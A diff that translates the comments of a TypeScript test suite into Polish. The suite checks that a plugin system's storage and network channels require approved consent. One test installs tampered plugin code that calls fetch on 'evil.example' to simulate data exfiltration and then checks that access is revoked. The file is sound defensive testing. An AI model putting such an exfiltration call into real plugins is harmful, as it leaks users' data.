@@ -4,15 +4,15 @@ import { createHash } from 'node:crypto';
 import { join } from 'node:path';
 import { tmpdir } from 'node:os';
 
-// The capability channels used to check the plugin's MANIFEST only. That made
-// every installed plugin — including one the user never activated, and one
-// whose code or permissions changed after the review — able to use its own
-// storage and to borrow the app's network identity through IPC.
+// Kanały uprawnień sprawdzały kiedyś tylko MANIFEST pluginu. To sprawiało, że
+// każdy zainstalowany plugin — w tym ten, którego użytkownik nigdy nie aktywował, i ten,
+// którego kod lub uprawnienia zmieniły się po przeglądzie — mógł używać własnego
+// storage i pożyczać tożsamość sieciową aplikacji przez IPC.
 //
-// One userData dir for the whole file on purpose: plugins-handlers caches the
-// resolved plugins directory on first use, so a per-test dir would have every
-// test after the first read the previous one's plugins. Tests isolate
-// themselves by plugin id instead, which is also the real isolation key.
+// Celowo jeden katalog userData dla całego pliku: plugins-handlers cache'uje
+// rozwiązany katalog pluginów przy pierwszym użyciu, więc katalog per test sprawiłby, że każdy
+// test po pierwszym czytałby pluginy poprzedniego. Testy izolują się
+// zamiast tego przez id pluginu, co jest też prawdziwym kluczem izolacji.
 
 type Handler = (event: unknown, ...args: unknown[]) => unknown;
 const handlers = new Map<string, Handler>();
@@ -41,7 +41,7 @@ const ENTRY = 'api.log.info("demo");';
 const sha256Hex = (value: string): string =>
   createHash('sha256').update(value, 'utf-8').digest('hex');
 
-/** Installs a plugin and returns the consent the main process will compute. */
+/** Instaluje plugin i zwraca zgodę, którą obliczy proces główny. */
 async function install(
   id: string,
   manifest: Record<string, unknown> = MANIFEST,
@@ -103,7 +103,7 @@ describe('plugin capability channels require approval', () => {
     await writeState({ 'tampered-code': { enabled: true, approvedConsent: consent } });
     expect(await invoke('plugins:storage:set', 'tampered-code', 'k', 'v')).toBe(true);
 
-    // The plugin's code is edited to exfiltrate; the digest no longer matches.
+    // Kod pluginu jest edytowany, by eksfiltrować dane; digest już się nie zgadza.
     await install('tampered-code', MANIFEST, 'api.fetch("https://evil.example", {})');
 
     expect(await invoke('plugins:storage:keys', 'tampered-code')).toEqual([]);
